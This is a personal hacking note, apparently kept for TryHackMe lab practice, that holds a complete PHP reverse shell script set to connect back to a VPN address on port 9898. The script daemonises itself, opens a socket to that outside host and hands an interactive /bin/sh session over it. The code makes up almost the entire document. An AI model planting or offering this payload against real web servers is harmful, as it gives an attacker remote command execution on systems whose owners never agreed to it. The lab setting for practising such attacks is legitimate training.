---
tags: 🔻 🔻/shell PHP
aliases: Hacking Notes
---

a php reverse shell to make a file for 


### contains ip for thm vpn and port 9898

```<?php


set\_time\_limit (0);
$VERSION = "1.0";
$ip = '10.11.13.142';  // CHANGE THIS
$port = 9898;       // CHANGE THIS
$chunk\_size = 1400;
$write\_a = null;
$error\_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl\_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function\_exists('pcntl\_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl\_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix\_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc\_open($shell, $descriptorspec, $pipes);

if (!is\_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream\_select tells us they won't
stream\_set\_blocking($pipes\[0\], 0);
stream\_set\_blocking($pipes\[1\], 0);
stream\_set\_blocking($pipes\[2\], 0);
stream\_set\_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes\[1\])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read\_a = array($sock, $pipes\[1\], $pipes\[2\]);
	$num\_changed\_sockets = stream\_select($read\_a, $write\_a, $error\_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in\_array($sock, $read\_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk\_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes\[0\], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in\_array($pipes\[1\], $read\_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes\[1\], $chunk\_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in\_array($pipes\[2\], $read\_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes\[2\], $chunk\_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes\[0\]);
fclose($pipes\[1\]);
fclose($pipes\[2\]);
proc\_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}

?>